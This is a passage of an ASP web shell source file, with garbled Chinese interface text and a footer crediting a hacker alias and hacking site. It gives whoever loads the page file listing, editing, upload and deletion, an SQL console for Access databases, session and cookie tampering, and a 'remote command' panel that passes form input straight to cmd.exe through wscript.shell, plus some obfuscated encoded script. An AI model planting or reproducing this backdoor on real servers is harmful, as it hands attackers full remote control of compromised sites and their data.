   %> <table border="0" width="100%" id="table11" class="table1"><tr><form method="POST" name="EditFileForm" action="<%=FileName%>?Work=PostEditFile&ReFilePath=<%=GetMyFilePath%>"><th>ÎÄ¼þ±à¼</th></tr><tr><td class="td1">µ±Ç°ÎÄ¼þ:<FONT COLOR="#FF3300"><%=GetMyFilePath%></FONT></td></tr><tr><td class="td1" align="center"><%Response.Write"<SPAN id='nStr' style='display:none'><!--"&Trim(Strings)&"//--></SPAN>"&Chr(13)%> <textarea rows="24" name="FileStr" cols="59"></textarea> </td></tr><tr><td class="td1">(<FONT COLOR="#FF0000">×¢Òâ£ºÔÚµ÷³ö±¾ÎÄ¼þÄÚÈÝµÄ¹ý³ÌÖÐ£¬ËùÓÐµÄ"&lt;!--"¡¢"//--&gt;"¡¢"--&gt;"±ê¼ÇÒÑ¾È«²¿¹ýÂË£¡ÔÚ±à¼¹ý³ÌÖÐ±ØÐëÒª×¢ÒâÎÄ¼þÄÚÈÝµÄÍêÕûÐÔ¡£</FONT>)</td></tr><tr><td class="td1" align="center"><input type="submit" value="Ìá½»" name="B10"></td></form></tr></table><SCRIPT LANGUAGE="JavaScript">
   <!--
   PostSrt()
   //-->
   </SCRIPT>
   <%End Sub%> <%
   'Êý¾Ý¿â¹Ø±Õ
   Public Function CloseDate()
   Conn.close
   Set conn = Nothing
   End Function
   'AccessÁ¬½Ó
   Public Function Access(Paths)
   On Error Resume Next
   dim conn,connstr
   If Instr(Paths,":")=0 Then
          Paths=Server.Mappath(Paths)
   End If
   Set conn = Server.CreateObject("ADODB.Connection")
   connstr="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Paths
   conn.Open connstr
   If Err Then
           err.Clear
           Call CloseDate()
           Response.Write "Êý¾Ý¿âÁ¬½Ó³ö´í£¬ÇëÑ¡ÔñÕýÈ·µÄÂ·¾¶¡£"
           Response.End
   End If
   End Function

   Public Function MyDataEdit()
   Dim PostB1,MyRadio,DataPaht,User,Pass,SQLString
   'Á¬½Ó Or Ö´ÐÐ
   PostB = Request.Form("B5")
   'Êý¾Ý¿âÀàÐÍ
   MyRadio = Request.Form("DateType")
   'Êý¾Ý¿âÂ·¾¶
   DataPaht = Trim(Request.Form("DataPaht"))
   'ÓÃ»§Ãû
   User = Request.Form("User")
   Pass = Request.Form("Password")
   'SQLÓï¾ä
   SQLString = Request.Form("SQLString")
   'Êý¾Ý¿âÁ¬½Ó¿ªÊ¼:
   Select Case MyRadio
          Case "Access"
          Call Access(DataPaht)
          Case "MsSQL"
   Response.Write "MsSQL"
   End Select
   Select Case PostB
          Case "Á¬½Ó"
   Response.Write "½ÓÁ¬"
          Case "Ö´ÐÐ"
   Response.Write "Ö´ÐÐ"
   End Select
   Response.Redirect Filename&"?Work=ShowGetDataWin&DatePaht="&DataPaht
   End Function

   %> <%Sub GetDataWin()
   Dim DatePath,IsData
   DatePath = Request("DatePaht")
   %> ¡¡<table border="1" width="100%" id="table7" class="table1"><tr><form method="POST" action="<%=FileName%>?Work=CallData" name="DatePathForm"><th colspan="2">Êý¾Ý¿â²Ù×÷</th></tr><%If DatePath = "" Then%> <tr><td class="td1" width="18%" align="right">Ä¿±êÊý¾Ý¿â:</td><td class="td1" width="78%">(<font color="#FF0000">×¢Òâ:ÌîÐ´Ïà¶ÔÂ·¾¶»ò¾ø¶ÔÂ·¾¶</font>)<br><input type="text" name="DataPaht" size="49" value="/MyData.mdb"> <br>AccessÊý¾Ý¿â:<input type="radio" name="DateType" value="Access" checked>
           SQLÊý¾Ý¿â:<input type="radio" name="DateType" value="MsSQL"> </td></tr><tr><td class="td1" colspan="2" align="center">ÓÃ»§:<input type="text" name="User" size="17"> ÃÜÂë:<input type="text" name="Password" size="17"></td></tr><tr><td class="td1" colspan="2" align="center"><input type="submit" value="Á¬½Ó" name="B5" class="button"></td></tr><%Else
   '¶ÁÈ¡Êý¾Ý¿âµÄ±í
   'Set Rsschema=conn.Openschema(20)
   'Rsschema.Movefirst
   'Do Until Rsschema.Eof
   'If Rsschema("Table_type")="Table" Then
   'response.write "<script>document.getElementById(""DataInfo"").innerHTML="&Rsschema("Table_name") & "<Br>"
   'End If
   'Rsschema.Movenext
   'Loop
   'Set conn=Nothing
   %> <tr><td class="td1" width="18%" align="right">³É¹¦Á¬½Ó:</td><td class="td1" width="78%"><input type="text" name="DataPaht" size="47"value="<%=DatePath%>" readonly></td></tr><tr><td class="td1" colspan="2" align="center"><font color="#FF0000">SQLÓï¾ä:</font><br>

   <textarea rows="8" name="SQLString" cols="59"></textarea></td></tr><tr><td class="td1" colspan="2" align="center">[<a href="#" onclick='JavaScript:InSQLString("Create Table [Êý¾Ý±íÃû³Æ(×Ö¶Î1 ÀàÐÍ1(³¤¶È),×Ö¶Î2 ÀàÐÍ2(³¤¶È) ¡¡ )]")'>ÐÂ½¨±í</a>] [<a href="#" onclick='JavaScript:InSQLString("Drop Table [Êý¾Ý±íÃû³Æ]")'>É¾³ý±í</a>] [<a href="#" onclick='JavaScript:InSQLString("Select * From [Êý¾Ý±í] Where [×Ö¶ÎÃû] Order by [×Ö¶ÎÃû] [desc]")'>order by</a>] [<a href="#" onclick='JavaScript:InSQLString("Insert into [Ä¿±êÊý¾Ý±í] Select * From [Ô´Êý¾Ý±í]")'>¸´ÖÆÊý¾Ý</a>]<br>[<a href="#" onclick='JavaScript:InSQLString("Insert Into [Êý¾Ý±í] (×Ö¶Î1,×Ö¶Î2,×Ö¶Î3 ¡) Valuess (Öµ1,Öµ2,Öµ3 ¡)")'>Ìí¼ÓÊý¾Ý</a>] [<a href="#" onclick='JavaScript:InSQLString("Delete From [Êý¾Ý±í] Where [Ìõ¼þ±í´ïÊ½]")'>É¾³ýÊý¾Ý</a>] [<a href="#" onclick='JavaScript:InSQLString("Update [Êý¾Ý±í] Set [×Ö¶ÎÃû]=[×Ö¶ÎÖµ] Where [Ìõ¼þ±í´ïÊ½]")'>¸üÐÂÊý¾Ý</a>] [<a href="#" onclick='JavaScript:InSQLString("Select * From [Êý¾Ý±í]")'>¶ÁÈ¡Êý¾Ý</a>]</td></tr><tr><td class="td1" colspan="2" align="center"><div id="DataInfo">fffff</div></td></tr><tr><td class="td1" colspan="2" align="center"><input type="submit" value="Ö´ÐÐ" name="B5" class="button"></td></form></tr><%End If%> </table><%End Sub%> <%Sub ShellWin(MyCommand)%> ¡¡<table border="1" width="100%" id="table8" class="table1"><tr><form method="POST" action="<%=Filename%>?Work=ShowShellForm" name="RunShellform"><th colspan="2">Ô¶³ÌShellÖ´ÐÐ</th></tr><tr><td class="td1" width="12%" align="right">ÃüÁîÐÐ:</td><td class="td1" width="84%"><input type="text" name="Command" value="<%=MyCommand%>" size="50"></td></tr><tr><td class="td1" align="center" colspan="2"><textarea rows="8" name="S1" cols="59" readonly>
   <%=Server.Createobject("wscript.shell").exec("cmd.exe /c "&MyCommand).stdout.readall%>
   </textarea> </td></tr><tr><td class="td1" align="center" colspan="2"><input type="submit" value="Ö´ÐÐ" name="B8" class="button"></td></tr></table><%End Sub%> <%Sub CookieWin()%> <table border="1" width="100%" id="table9" class="table1"><tr><form method="POST" action="<%=Filename%>?Work=SetCookie" name="SetCookie"><th>ÉèÖÃCookies</th></tr><tr><td class="td1"><font color="#FF0000">Response.Cookies("<input type="text" name="Cookie1" size="6">") ("<input type="text" name="Cookie2" size="6">") = ("<input type="text" name="Cookie3" size="6">")</font> <input type="submit" value="Ìá½»" name="B7" class="button"> </td></form></tr><tr><td class="td1"><B>µ±Ç°±¾Õ¾µã±£´æÔÚÄã»úÉÏµÄËùÓÐCookiesÈçÏÂ£º</B><br><%
   Dim Items
   For Each Items In Request.Cookies
   If Request.Cookies(Items).Haskeys Then
   For Each Itemkey In Request.Cookies(Items)
   Response.Write "Response.Cookies('"&Items &"')('"&Itemkey&"')="& Request.Cookies(Items)(Itemkey)& "<A href='"&FileName&"?Work=DelCookies&CookieValue="&Items&"'><FONT COLOR='#FF3300'>[É¾]</FONT></A><Br>"
   Next
   Else
   Response.Write "Response.Cookies('"&Items &"')="& Request.Cookies(Items) & "<A href='"&FileName&"?Work=DelCookies&CookieValue="&Items&"'>[<FONT COLOR='#FF3300'>É¾</FONT>]</A><Br>"
   End If
   Next
   %> </td></tr><tr><form method="POST" action="<%=Filename%>?Work=SetSesValue" name="SetSession"><th>SessionÖµ¹ÜÀí</th><tr><td class="td1" align="center"><font color="#FF0000">Session(" <input type="text" name="SetValue" size="12"> ") = ("<input type="text" name="MyValue" size="12">")</font> <input type="submit" value="ÉèÖÃ" name="B6" class="button"> </td></form></tr><tr><td class="td1"><b>µ±Ç°±¾Õ¾µã±£´æÔÚÄú»úÉÏµÄËùÓÐSessionÈçÏÂ£º</b><br>SessionÊýÁ¿:<font color="#FF0000"><%=Session.Contents.Count%></font><br><%
   Dim strName,iLoop
   For Each strName in Session.Contents
   If IsArray(Session(strName)) then
   For iLoop = LBound(Session(strName)) to UBound(Session(strName))
   Response.Write "session('"&strName & ")(" & iLoop & ") = " & Session(strName)(iLoop) & "<a href='"&Filename&"?Work=DelSess&SessValue="&strname&"'>[<FONT  COLOR='#FF3300'>É¾</FONT>]</a><BR>"
   Next
   Else
   Response.Write "session('"&strName & "') = " & Session.Contents(strName) & "<a href='"&Filename&"?Work=DelSess&SessValue="&strname&"'>[<FONT  COLOR='#FF3300'>É¾</FONT>]</a><BR>"
   End If
   next
   %> </td></tr></table><%End Sub%> <%Sub KeyWin()%> <table border="1" width="100%" id="table10" class="table1"><tr><th class="th1">¼üÅÌ¼üÖµ²éÑ¯</th></tr><tr><td class="td1" align="center"><SCRIPT LANGUAGE='JScript.Encode'>#@~^9gAAAA==W!x^DkKxP,3 zfKhU`*P~~,@#@&P~P@#@&P,~~P,P7l.P~V X^W9nP,'~~ \+UOc3nX;G9+I,P@#@&P,P,~P,\CD,P.nmV3 zP,'P,jODbxTRWDGh;tCD;GN `n- xY V X/W9n*i~,@#@&PP,P,~P,P~P9W^;s+xD l^VRVnO| XkR-ls; PxP0nX1W[n,P@#@&~,P~P,~,P~,P9Wm!: UYclsVcqUFH+/cd+^+mDcb@#@&8,@#@&8UIAAA==^#~@</SCRIPT>
   <script>
   <!--
   document.write(unescape("%u7ED3%u679C%u503C%uFF1A%3Cinput%20%20type%3D%22text%22%20name%3D%22GetKeys%22%20readOnly%20size%3D%225%22%20onmouseover%3D%22this.select%28%29%22%3E%20%20%20%0D%0A%u8F93%u5165%u952E%uFF1A%3Cinput%20%20type%3D%22text%22%20%20onKeyPress%3D%22keyDown%28%29%22%20maxlength%3D%221%22%20name%3D%22InKyes%22%20size%3D%223%22%3E%20%0D%0A"));
   //-->
   </script>
   </td></tr></table>
   <%End Sub%>
   <%
   'Ñ¹Ëõ
   Const JET_3X = 4
   Function CompactDB(dbPath, boolIs97,Pass)
   On Error Resume Next
   Dim fso, Engine, strDBPath
   strDBPath = left(dbPath,instrrev(DBPath,"\"))
   Set fso = CreateObject("Scripting.FileSystemObject")
   If fso.FileExists(dbPath) Then
   Set Engine = CreateObject("JRO.JetEngine")
   If boolIs97 = "Data97" Then
   Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbpath, _
   "Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password='"&Pass&"';Data Source=" & strDBPath & "temp.mdb;" _
   & "Jet OLEDB:Engine Type=" & JET_3X
   Else
   Engine.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Jet OLEDB:Database Password='"&Pass&"';Data Source=" & dbpath, _
   "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & strDBPath & "temp.mdb"
   End If
   If Err Then
   CompactDB = Err.Description
   Exit Function
   End if
   fso.CopyFile strDBPath & "temp.mdb",dbpath
   fso.DeleteFile(strDBPath & "temp.mdb")
   Set fso = nothing
   Set Engine = nothing
   CompactDB = "ÄãµÄÊý¾Ý¿â, " & dbpath & ", ÒÑ¾Ñ¹Ëõ³É¹¦!" & vbCrLf
   Response.Write"<script>opener.window.location.reload()</script>"
   Else
   CompactDB = "Êý¾Ý¿âÃû³Æ»òÂ·¾¶²»ÕýÈ·. ÇëÖØÊÔ!" & vbCrLf
   End If
   End Function
   Sub Compressmdb(mdbPath)%>
   <table border="1" width="100%" id="table12" class="table1">
   <tr><form method="POST" name="YaSuoMdb" action="<%=Filename%>?Work=CompreData">
   <td class="td1" colspan="2">Â·Êý¿âÂ·¾¶:<input type="text" name="MdbPath" size="49" readonly value="<%=mdbPath%>"></td></tr>
   <tr><td class="td1" align="right" width="15%">ÃÜÂë:</td><td class="td1" width="82%"><font color="#FF0000">
   <input type="text" name="MdbPass" size="20">(Èç¹ûÃ»ÓÐÃÜÂëÇë²»ÒªÌîÐ´ÈÎºÎ¶«Î÷)</font></td></tr>
   <tr><td class="td1" align="center" colspan="2">
   ACCESS97:<input type="radio" name="V2" value="Data97">
   ACCESS2000:<input type="radio" name="V2" value="Data2000" checked></td></tr>
   <tr><td class="td1" align="center" colspan="2">
   <input type="Submit" value="È·¶¨Ñ¹Ëõ" name="ComPrsmdb" class="button"></td></form></tr></table>
   <%End Sub%>
   <%Sub MyMouseWin()%>
   <table border="1" width="100%" id="table10" class="table1"><tr><td class="td1" align="center">[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowKeyWin','KeyWin','500','150','')">¼üÅÌ¼üÖµ²éÑ¯</a>] </td></tr><tr><td class="td1" align="center">[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowListFileWin','ListWin','500','500','')">ÎÄ¼þÁÐ±í</a>] <!--[<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowGetDataWin','DateWin','500','350','')">Êý¾Ý¿â²Ù×÷</a>]--> [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowShellWin','ShellWin','500','300','')">Ô¶³ÌÃüÁî</a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=ShowCookieWin','CookieWin','500','400','')">ÍøÕ¾ÑéÖ¤¹ÜÀí</a>] [<a href="#" onClick="javascript:ShowWin('<%=FileName%>?Work=outlogin','outWin','500','100','')">ÍË³öµÇÂ½</a>] </td></tr>
   <tr><td class="td1">
   <UL>
   <LI><STRONG>½øÈëÎÄ¼þÁÐ±í£¬Äú¿ÉÒÔ½øÐÐ¸üÏ¸ÖÂµÄ²Ù×÷¡£</STRONG></LI></UL>
   <OL>
   <OL>
   <LI>ÐÂ½¨ÎÄ¼þ¼Ð¡£
   <LI>ÐÂ½¨¿ÕÎÄ¼þ¡£¿ÉÒÔÔÚÏß±àÐ´ÐÂÎÄ¼þ¡£
   <LI>ÉÏ´«ÎÄ¼þ£¨Ö§³Ö¶à¸öÎÄ¼þÉÏ´«£©¡£
   <LI>ÎÄ¼þ±à¼£»¸´ÖÆ£»É¾³ý¡£
   <LI>Êý¾Ý¿âÑ¹Ëõ¡£
   <LI>ä¯ÀÀËùÓÐµÄÎÄ¼þ¼ÐÒÔ¼°ÎÄ¼þµÄÏêÏ¸ÐÅÏ¢.</LI></OL></OL>
    </td></tr>
   </table><%End Sub%>
   <%
   Sub DelFile(DelPath)
   On Error Resume Next
   Call IsRoot(DelPath)
     Obj.DeleteFile(DelPath)
   If Err Then
   Show(Err.Description)
   Exit Sub
   Else
   Show("ÎÄ¼þÉ¾³ý³É¹¦!")
   Response.Write"<script>opener.window.location.reload()</script>"
   End If
   Set Obj = Nothing
   End Sub
   Sub DelFolser(DelFolderPath)
   On Error Resume Next
   Call IsRoot(DelFolderPath&SpPath)
     Obj.DeleteFolder(DelFolderPath)
   If Err Then
   Show(Err.Description)
   Exit Sub
   Else
   Show("ÎÄ¼þ¼ÐÉ¾³ý³É¹¦!")
   Response.Write"<script>opener.window.location.reload()</script>"
   End If
   Set Obj = Nothing
   End Sub

   Sub DelSession(SessValue)
   Session.Contents.Remove(Sessvalue)
   Response.Redirect Filename&"?Work=ShowCookieWin"
   End Sub

   Sub SetSession(Sess1,Sess2)
   If Sess1<>"" Then
   Session(Sess1)=Sess2
   End If
   Response.Redirect Filename&"?Work=ShowCookieWin"
   End Sub

   Sub DelCookies(CookiesValue)
   Response.Cookies(CookiesValue).Expires=Date-1
   Response.Redirect Filename&"?Work=ShowCookieWin"
   End Sub

   Sub SetCookies(Co1,Co2,Co3)
   If Co1<>"" And Co2="" Then
   Response.Cookies(Co1).Expires=Date+30
   Response.Cookies(Co1)=Co3
   End If
   If Co1<>"" And Co2<>"" Then
   Response.Cookies(Co1).Expires=Date+30
   Response.Cookies(Co1)(Co2)=Co3
   End If
   Response.Redirect Filename&"?Work=ShowCookieWin"
   End Sub

   Select Case Request("Work")
   ':::::::::::ÏÔÊ¾´°¿ÚÅÐ¶Ï::::::::::::::::::
   Case "ShowUpFileWin"
   Call UpFileWim(Request("PutPath"))
   Case "ShowFolderWin"
   Call FolderWin(Request("NewFolderPath"))
   Case "ShowFileWin"
   Call FileWin(Request("NewFilePath"))
   Case "ShowCopyFileWin"
   Call CopyFileWin(Request("CopyPath"))
   Case "ShowListFileWin"
   Call ListFileWin(Request("ListPath"))
   Case "ShowEditFileWin"
   Call EditFile(Request("EditPath"))
   Case "ShowGetDataWin"
   Call GetDataWin()
   Case "ShowShellWin"
   Call ShellWin(Null)
   Case "ShowCookieWin"
   Call CookieWin()
   Case "ShowKeyWin"
   Call KeyWin()
   Case "ShowMdbWin"
   Call Compressmdb(Request("MdbPath"))
   'Case ""
   'Call
   'Case ""
   'Call
   'Case ""
   'Call
   'Case ""
   'Call
   'Case ""
   'Call
   '::::::Êý¾Ý´¦ÀíÅÐ¶Ï:::::::::::
   Case "PutFile"
   Call SaveUp()
   Case "NewFolder"
   Call SaveFolder(Trim(Request.Form("FolderPath")),Trim(Request.Form("NewFolder")))
   Case "NewFile"
   Call SaveFile(Trim(Request.Form("FilePath")),Trim(Request.Form("NewFileName")))
   Case "CopyFiles"
   Call CopyFile(Request.Form("CopyPath"),Trim(Request.Form("NewCopyName")))
   Case "PostEditFile"
   Call SaveEditFile(Request("ReFilePath"),Request.Form("FileStr"))
   Case "ShowDelFilewin"
   Call DelFile(Request("DelPath"))
   Case "ShowDelFolderwin"
   Call DelFolser(Request("DelFolderPath"))
   Case "ShowShellForm"
   Call ShellWin(Trim(Request.Form("Command")))
   Case "DelSess"
   Call DelSession(Request("SessValue"))
   Case "SetCookie"
   Call SetCookies(Trim(Request.Form("Cookie1")),Trim(Request.Form("Cookie2")),Trim(Request.Form("Cookie3")))
   Case "DelCookies"
   Call DelCookies(Request("CookieValue"))
   Case "SetSesValue"
   Call SetSession(Trim(Request.Form("SetValue")),Trim(Request.Form("MyValue")))
   Case "CallData"
   Call MyDataEdit()
   Case "CompreData"
   Show(CompactDB(Request.form("MdbPath"), Request.form("V2"), Request.form("MdbPass")))
   'Case ""
   'Call
   'Case ""
   'Call
   Case Else
   Call MyMouseWin()
   End Select
   End If
   %> </td></tr><tr><td align="center" bgcolor="#F6F6F6">Copyright &copy;2006 [<FONT COLOR='#9966FF'>ºÚ»ùID£ºllt123321  ºÚ¿Í58ID£ºllt123321</FONT>]ÖÆ×÷£¬Ö÷Ò³£º<A HREF='http://hackxx.bak.cn/' target='_blank'>http://hackxx.bak.cn/</A></td></tr></table></div></body></html>
